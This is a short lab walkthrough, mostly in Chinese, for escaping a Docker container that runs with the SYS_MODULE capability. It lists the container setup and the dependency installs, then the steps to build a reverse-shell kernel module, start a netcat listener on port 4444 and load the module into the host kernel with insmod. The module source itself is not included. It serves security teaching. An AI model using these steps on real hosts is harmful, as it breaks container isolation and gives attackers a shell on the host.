# SYS_MODULE abuse
## Description
当容器以cap_sys_module功能运行时，它可以将内核模块注入主机的运行内核，因为隔离是在操作系统级别而不是内核/硬件级别完成的，容器最终使用docker运行时引擎与主机机器内核进行交互。在这个实验室中，您会发现容器正在运行额外的cap_sys_module功能，当您使用默认参数启动容器时，该功能不会正常添加

## Usage

创建容器

```bash
docker run -it --cap-drop=ALL --cap-add=SYS_MODULE ubuntu:<HOST-OS-VERDION> bash
docker run -it --cap-drop=ALL --cap-add=SYS_MODULE --cap-add=SETGID --cap-add=SETUID --cap-add=CHOWN --cap-add=FOWNER --cap-add=DAC_OVERRIDE ubuntu:<HOST-OS-VERDION> bash
```

在容器内安装依赖

```bash
apt install make
apt install -y vim # or any other editor
apt install -y netcat
apt install -y gcc
# Container should run with the same operating system version as the host.
# Get the kernel version by ‘uname -r’
version=$(uname -r)
apt install -y linux-headers-$version
apt install -y kmod
apt install net-tools
```

逃逸方式
```bash
# Get the IP address of the container
ifconfig
# Copy the revese-shell.c and update the IP address in the code with the IP of the container
vim reverse-shell.c
# Copy the Makefile
vim Makefile
make
nc -lnvp 4444 &
# Inject the module into the kernel’s host
insmod reverse-shell.ko
fg %<JOB-ID> 
```